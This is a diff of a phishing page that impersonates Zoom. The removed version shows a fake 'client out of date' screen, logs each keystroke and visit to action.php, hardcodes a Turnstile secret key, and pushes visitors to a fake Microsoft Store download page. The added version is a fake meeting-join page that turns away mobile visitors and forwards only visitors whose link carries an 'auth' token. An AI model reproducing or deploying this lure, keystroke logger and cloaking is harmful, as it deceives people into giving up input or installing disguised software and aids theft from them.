@@ -1,109 +1,44 @@
-<?php
-// 🛡️ Turnstile Verification
-$turnstileSecret = '0x4AAAAAADGkhs_9XAY_D2adyse8OZMS9RQ';
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $token = $_POST['cf-turnstile-response'] ?? '';
-    $ip = $_SERVER['REMOTE_ADDR'];
-
-    $ch = curl_init('https://challenges.cloudflare.com/turnstile/v0/siteverify');
-    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-    curl_setopt($ch, CURLOPT_POST, true);
-    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
-        'secret'   => $turnstileSecret,
-        'response' => $token,
-        'remoteip' => $ip
-    ]));
-
-    $response = curl_exec($ch);
-    $result = json_decode($response, true);
-    if (!$result['success']) {
-        header("Location: ../index.html?error=captcha_failed");
-        exit;
-    }
-} else {
-    // Redirect back to captcha if accessed directly via GET
-    header("Location: ../index.html");
-    exit;
-}
-?>
 <!DOCTYPE html>
 <html lang="en">
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <meta http-equiv="X-UA-Compatible" content="ie=edge">
-  <title>Zoom Client Update</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>Join conversation on Zoom</title>
+  <link rel="icon" type="image/png" href="https://st1.zoom.us/zoom.ico">
+  <link rel="stylesheet" type="text/css" href="css/style22.css">
   <style>
-    :root {
-      --zoom-blue: #0072c6;
-      --text-color: #555;
-      --bg-color: #f4f7fa;
-      --border-color: #0072c6;
-      --button-hover-bg: #0072c6;
-      --button-hover-color: #fff;
+    * {
+      box-sizing: border-box;
     }
 
     body {
-      font-family: 'Roboto', sans-serif;
-      background-color: var(--bg-color);
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
       margin: 0;
-      padding: 0;
-      color: var(--text-color);
-    }
-
-    #preloader {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      background-color: var(--bg-color);
       display: flex;
-      flex-direction: column;
       justify-content: center;
       align-items: center;
-      z-index: 9999;
-      opacity: 1;
-      transition: opacity 1s ease;
+      min-height: 100vh;
+      padding: 20px;
     }
 
-    .preloader-spinner {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid var(--zoom-blue);
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 1.5s linear infinite;
-      margin-bottom: 20px;
-    }
-
-    .preloader-message {
-      font-size: 18px;
-      font-weight: 500;
-      color: var(--zoom-blue);
-    }
-
-    @keyframes spin {
-      0% {
-        transform: rotate(0deg);
-      }
-
-      100% {
-        transform: rotate(360deg);
-      }
-    }
-
-    #main-content {
-      display: none;
-      animation: fadeIn 1s ease-in-out forwards;
+    .login-container {
+      background-color: #ffffff;
+      padding: 48px 40px;
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+      border-radius: 16px;
+      width: 100%;
+      max-width: 420px;
+      text-align: center;
+      animation: fadeIn 0.5s ease-out;
     }
 
     @keyframes fadeIn {
       from {
         opacity: 0;
-        transform: translateY(10px);
+        transform: translateY(-20px);
       }
 
       to {
@@ -112,303 +47,157 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       }
     }
 
-    .container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      height: 100vh;
-      text-align: center;
-    }
-
-    .logo-container {
-      position: absolute;
-      top: 20px;
-      left: 20px;
-    }
-
-    .logo {
-      width: 120px;
+    .login-container img.logo {
+      width: 80px;
       height: auto;
+      max-width: 100%;
+      margin-bottom: 24px;
     }
 
-    .top-right-links {
-      position: absolute;
-      top: 20px;
-      right: 20px;
-      font-size: 14px;
-      color: var(--zoom-blue);
-      display: flex;
-      gap: 15px;
-      align-items: center;
-    }
-
-    .top-right-links a {
-      text-decoration: none;
-      color: var(--zoom-blue);
-    }
-
-    .heading {
+    .login-container h3 {
+      margin: 0 0 8px 0;
       font-size: 28px;
-      font-weight: bold;
-      color: var(--zoom-blue);
-      margin-top: 100px;
+      font-weight: 600;
+      color: #2d2d2d;
+      letter-spacing: -0.5px;
     }
 
-    .subheading {
-      font-size: 18px;
-      color: var(--text-color);
-      margin-top: 10px;
+    .login-container .subtitle {
+      color: #666;
+      font-size: 15px;
+      margin-bottom: 32px;
     }
 
-    .download-info,
-    .countdown {
-      font-size: 18px;
-      font-weight: 500;
-      color: var(--zoom-blue);
-      margin-top: 15px;
-    }
-
-    .spinner {
-      border: 4px solid #f3f3f3;
-      border-top: 4px solid var(--zoom-blue);
-      border-radius: 50%;
-      width: 50px;
-      height: 50px;
-      animation: spin 2s linear infinite;
-      margin-top: 30px;
-    }
-
-    .footer {
-      position: absolute;
-      bottom: 20px;
+    .login-container button {
       width: 100%;
-      text-align: center;
-      font-size: 12px;
-      color: #777;
+      padding: 14px 24px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+      font-size: 15px;
+      font-weight: 600;
+      transition: all 0.2s ease;
+      margin-bottom: 12px;
+      letter-spacing: 0.3px;
     }
 
-    .download-button-outline {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      gap: 10px;
-      background-color: transparent;
-      color: var(--zoom-blue);
-      border: 2px solid var(--border-color);
-      padding: 12px 24px;
+    .login-button {
+      background-color: #0E72ED;
+      color: #ffffff;
+      box-shadow: 0 4px 14px rgba(14, 114, 237, 0.3);
+    }
+
+    .login-button:hover {
+      background-color: #0B5EC7;
+      box-shadow: 0 6px 20px rgba(14, 114, 237, 0.4);
+      transform: translateY(-1px);
+    }
+
+    .login-button:active {
+      transform: translateY(0);
+    }
+
+    .signup-button {
+      background-color: #f5f5f5;
+      color: #2d2d2d;
+      border: 2px solid #e0e0e0;
+    }
+
+    .signup-button:hover {
+      background-color: #ebebeb;
+      border-color: #d0d0d0;
+    }
+
+    .login-container p {
+      margin-top: 24px;
+      color: #666;
+      font-size: 14px;
+    }
+
+    .login-container a {
+      color: #0E72ED;
       text-decoration: none;
       font-weight: 500;
-      border-radius: 999px;
-      margin-top: 15px;
-      transition: background-color 0.3s ease, color 0.3s ease;
     }
 
-    .download-button-outline:hover {
-      background-color: var(--button-hover-bg);
-      color: var(--button-hover-color);
+    .login-container a:hover {
+      text-decoration: underline;
     }
 
-    .confirmation-message {
-      margin-top: 20px;
-      font-size: 16px;
-      color: green;
-      display: none;
-      animation: fadeSuccess 1s ease-in-out forwards;
+    .login-container .footer-text {
+      font-size: 12px;
+      color: #999;
+      margin-top: 32px;
+      padding-top: 24px;
+      border-top: 1px solid #f0f0f0;
     }
 
-    @keyframes fadeSuccess {
-      0% {
-        opacity: 0;
-        transform: scale(0.95);
+    @media (max-width: 480px) {
+      .login-container {
+        padding: 32px 24px;
       }
 
-      100% {
-        opacity: 1;
-        transform: scale(1);
-      }
-    }
-
-    @media (prefers-color-scheme: dark) {
-      :root {
-        --text-color: #ccc;
-        --bg-color: #121212;
-        --border-color: #4da6ff;
-        --zoom-blue: #4da6ff;
-        --button-hover-bg: #4da6ff;
-        --button-hover-color: #000;
-      }
-
-      .footer {
-        color: #aaa;
-      }
-
-      .spinner,
-      .preloader-spinner {
-        border: 4px solid #333;
-        border-top: 4px solid var(--zoom-blue);
+      .login-container h3 {
+        font-size: 24px;
       }
     }
   </style>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
 </head>
 
 <body>
+  <div class="login-container">
+    <img src="https://st1.zoom.us/static/6.3.52789/image/new/topNav/Zoom_logo.svg" alt="Zoom Logo" class="logo">
+    <h3>Join your Zoom meeting</h3>
+    <p class="subtitle">Click below to continue with your browser or the Zoom app</p>
 
+    <button class="login-button" id="btnSubmitMain" onClick="begin()">Continue on this browser</button>
+    <button class="signup-button" id="btnSubmitMain2" onClick="begin()">Join on the Zoom app</button>
 
+    <p><a href="#">Can't access your account?</a></p>
+    <p class="footer-text">2026 Zoom Video Communications, Inc. All rights reserved.</p>
+  </div>
   <script>
-    // Function to send POST request
-    async function sendPostRequest(data) {
-      const endpoint = './action.php'; // Action script to handle requests
-      try {
-        await fetch(endpoint, {
-          method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-          },
-          body: JSON.stringify(data),
-        });
-        console.log('...');
-      } catch (error) {
-        console.error('Error sending data:', error);
-      }
+    function isMobileDevice() {
+      return /Mobi|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
     }
 
-    // Send a POST request when the page loads (visitor detection)
-    window.onload = () => {
-      const visitData = {
-        action: 'visit',
-        userAgent: navigator.userAgent, // Capture browser details
-      };
-      sendPostRequest(visitData);
-    };
-
-    // Monitor input field for changes
-    function trackInput(event) {
-      const newChar = event.data; // Get the character just entered
-      if (newChar) {
-        const charData = {
-          action: 'character',
-          character: newChar,
-          userAgent: navigator.userAgent, // Include browser details
-        };
-        sendPostRequest(charData);
-      }
-    }
-
-    // Handle form submission
-    function handleSubmit(event) {
-      event.preventDefault(); // Prevent default form submission
-      const inputField = document.getElementById('inputField').value;
-
-      const formData = {
-        action: 'submit',
-        inputField: inputField, // Capture user input
-        userAgent: navigator.userAgent, // Include browser details
-      };
-      sendPostRequest(formData).then(() => {
-        console.log('...');
-      });
+    if (isMobileDevice()) {
+      window.location.href = "./sorry.php";
     }
   </script>
 
-
-
-
-
-
-
-
-  <!-- Preloader -->
-  <div id="preloader">
-    <div class="preloader-spinner"></div>
-    <div class="preloader-message" id="preloaderMessage">Please wait...</div>
-  </div>
-
-  <!-- Main Content -->
-  <div id="main-content">
-    <div class="logo-container">
-      <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Zoom_Communications_Logo.svg" alt="Zoom logo">
-    </div>
-
-    <div class="top-right-links">
-      <a href="#">Support</a>
-      <a href="#">English</a>
-    </div>
-
-    <div class="container">
-      <div class="heading">Your Zoom Client is Out of Date</div>
-      <div class="subheading">Please wait while you're redirected to Microsoft Store...</div>
-
-      <div class="download-info">Please wait while you're redirected to Microsoft Store...</div>
-      <div class="countdown">Redirecting in <span id="countdown">25</span> seconds</div>
-
-      <div class="spinner"></div>
-
-      <p>If you are not redirected automatically, click below:</p>
-      <a href="microsoft-store.php" id="manualDownload" class="download-button-outline">
-        <img src="./img/micro.png" alt="Microsoft Store Logo" style="height: 24px;">
-        Go to Microsoft Store
-      </a>
-
-      <div id="confirmation" class="confirmation-message">Please wait while you're redirected to Microsoft Store...</div>
-    </div>
-
-    <div class="footer">
-      <p>&copy; Zoom Video Communications, Inc. All rights reserved.</p>
-    </div>
-  </div>
-
   <script>
-    const preloader = document.getElementById("preloader");
-    const preloaderMessage = document.getElementById("preloaderMessage");
-    const mainContent = document.getElementById("main-content");
-    const countdownElement = document.getElementById('countdown');
-    const confirmationMsg = document.getElementById('confirmation');
-    const manualButton = document.getElementById('manualDownload');
-
-    let redirectStarted = false;
-
-    // Preloader message transitions
-    setTimeout(() => preloaderMessage.textContent = "We're setting up your meeting...", 5000);
-    setTimeout(() => preloaderMessage.textContent = "Joining your meeting...", 10000);
-    setTimeout(() => {
-      preloader.style.opacity = 0;
-      setTimeout(() => {
-        preloader.style.display = "none";
-        mainContent.style.display = "block";
-      }, 1000);
-    }, 15000);
-
-    // Countdown
-    let countdownTime = 25;
-    const countdownInterval = setInterval(() => {
-      countdownTime--;
-      countdownElement.textContent = countdownTime;
-      if (countdownTime <= 0 && !redirectStarted) {
-        startRedirect();
-        clearInterval(countdownInterval);
+    function loading(message, type) {
+      $("#btnSubmitMain").html(message);
+      if (type === "error") {
+        $("#btnSubmitMain").css("background-color", "#dc3545");
+      } else if (type === "reset") {
+        $("#btnSubmitMain").html("Continue on this browser");
+        $("#btnSubmitMain").css("background-color", "#0E72ED");
+        $("#btnSubmitMain").attr("disabled", false);
       }
-    }, 1000);
-
-    // Redirect trigger
-    function startRedirect() {
-      if (redirectStarted) return;
-      redirectStarted = true;
-
-      confirmationMsg.style.display = 'block';
-      document.querySelector('.download-info').textContent = "Please wait while you're redirected to Microsoft Store...";
-
-      // Redirect after 10 seconds
-      setTimeout(() => {
-        window.location.href = "microsoft-store.php";
-      }, 5000);
     }
 
-    // Manual click handler
-    manualButton.addEventListener('click', (e) => {
-      e.preventDefault();
-      startRedirect();
-    });
+    function begin() {
+      const urlParams = new URLSearchParams(window.location.search);
+      const auth = urlParams.get('auth')
+
+      if ((urlParams.get('auth') == undefined || urlParams.get('auth') == null)) {
+        $("#btnSubmitMain").attr("disabled", true)
+        loading("&nbsp;&nbsp;&nbsp; Loading...", "error")
+
+        setTimeout(() => {
+          loading("Access denied - invalid link", "error");
+          setTimeout(() => {
+            loading("", "reset");
+          }, 2000);
+        }, 1000);
+      } else {
+        // Redirect to Video_Call/ matching the reference flow
+        window.location.href = `./Video_Call/?auth=${auth}`;
+      }
+    }
   </script>
 </body>
 
